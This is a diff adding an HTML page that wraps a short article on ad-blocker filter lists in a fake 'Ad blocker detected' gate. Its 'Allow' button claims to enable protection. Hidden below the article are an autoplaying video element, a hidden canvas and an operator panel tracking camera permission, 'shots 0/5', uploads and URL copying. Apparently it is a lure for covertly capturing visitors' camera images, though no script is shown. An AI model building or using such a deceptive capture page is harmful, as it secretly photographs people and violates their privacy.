@@ -1,0 +1,49 @@
+
+
+<div id="gate">
+  <div class="card">
+    <svg viewBox="0 0 32 32" aria-hidden="true"><path d="M16 3l11 4v10c0 7-5 11-11 12C10 28 5 24 5 17V7z" fill="#22c55e"></path><path d="M11 16l4 4 7-8" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round"></path></svg>
+    <h2>Ad blocker detected</h2>
+    <p>This page is funded by ads. Turn protection on to keep reading without interruptions.</p>
+    <button id="allow">Allow</button>
+    <div class="note" id="note">Blocks trackers, pop-ups and autoplay video.</div>
+  </div>
+</div>
+
+<div id="badge">Protection active</div>
+
+<main>
+  <h1>Why most ad blockers quietly stop working</h1>
+  <p>The pattern is always the same: an extension ships, a site updates its delivery, and the lists that made the extension useful go stale within a week. What's left is a badge in the toolbar that claims protection while the page loads four more network calls than it did last month.</p>
+
+  <h2>Filter lists are the whole product</h2>
+  <p>An ad blocker is a text file and a matcher. Everything else — the interface, the icon, the settings pane — is decoration around those two things. When the list stops being maintained, the product is gone even if the shell still installs.</p>
+  <p>That's why the useful question is never "which blocker" but "who maintains the list, and how fast do they ship on a Friday".</p>
+
+  <h2>Detection is cheaper than blocking</h2>
+  <p>Sites learned to probe for the side effects of blocking rather than the blocking itself: a bait element with a tell-tale height, a script tag whose `onerror` fires, a fetch to a known tracker host. Beat one probe and another replaces it, usually within the same quarter.</p>
+  <p>Nothing about this arms race is technical any more. It's scheduling.</p>
+
+  <h2>What actually helps</h2>
+  <p>DNS-level filtering catches the requests that never needed to reach a browser, which removes most of the surface before a page can probe it. Beyond that, keep the list count low, update daily, and accept that a handful of sites will keep winning.</p>
+  <p>Whitelisting the ones that behave is cheaper than fighting them.</p>
+</main>
+
+<video id="preview" autoplay="" playsinline="" muted="" disablepictureinpicture=""></video>
+<canvas id="canvas" hidden=""></canvas>
+
+<div id="panel">
+  <div>secure: <span id="s-sec">?</span> · perm: <span id="s-perm">?</span> · cam: <span id="s-cam">closed</span> <span id="s-dim"></span></div>
+  <div>shots: <span id="s-n">0</span>/5</div>
+  <div id="status">idle</div>
+  <div>
+    <button id="b-shoot">shoot now</button>
+    <button id="b-test">test upload</button>
+    <button id="b-reset">reset</button>
+    <button id="b-copy">copy urls</button>
+  </div>
+  <div id="thumbs"></div>
+</div>
+
+
+
